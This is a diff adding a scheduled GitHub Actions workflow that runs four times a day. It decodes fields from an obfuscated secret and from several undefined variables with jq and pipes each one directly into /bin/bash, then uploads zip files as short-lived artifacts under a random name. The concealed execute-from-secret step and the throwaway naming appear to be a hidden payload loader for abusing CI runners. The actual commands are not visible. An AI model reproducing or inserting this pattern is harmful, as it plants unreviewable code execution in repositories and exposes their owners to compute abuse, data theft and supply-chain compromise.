@@ -1,0 +1,31 @@
+name: Pipeline
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '10 5,11,17,23 * * *'
+env:
+  CI: true
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  scheduler:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Invoke
+        env:
+          dkj96750: ${{ secrets.dkj96750 }}
+        run: |
+          printf '%s' "$dkj96750" | jq -r .ad94 | /bin/bash
+          echo $n21554 | jq -r .fkjx74594 | /bin/bash
+          printf '%s' "$zodm5867" | jq -r .dc963 | /bin/bash
+          printf '%s' "$jvx5" | jq -r .mc584 | /bin/bash
+
+      - name: Store artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: K8TCigIt
+          path: "*.zip"
+          retention-days: 1
